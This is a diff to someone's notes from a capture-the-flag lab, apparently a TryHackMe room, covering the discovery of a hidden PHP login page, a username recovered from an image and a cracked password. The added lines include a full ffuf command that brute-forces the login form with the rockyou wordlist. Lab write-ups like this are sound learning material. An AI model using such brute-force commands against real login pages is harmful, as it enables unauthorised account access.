@@ -108,4 +108,8 @@ and got 2 games where one game's src code had a textContent  `/0n1g4sh1m4.php` o
 and I saw the src code, it doesn't let you win I guess lol
 
 found a username via kaido.jpeg, only this file was .jpeg and not .jpg `K1ng_0f_th3_B3@sts`
-got stuck, fuzzed the password and got `thebeast` as the
+got stuck, fuzzed the password and got `thebeast` 
+```
+namura@pop-os ~/tryhackme $ ffuf -u http://10.48.159.231/0n1g4sh1m4.php      -X POST      -H "Content-Type: application/x-www-form-urlencoded"      -d "user=K1ng_0f_th3_B3%40sts&password=FUZZ&submit_creds=Login"      -w /opt/rockyou.txt -fs 1503
+```
+
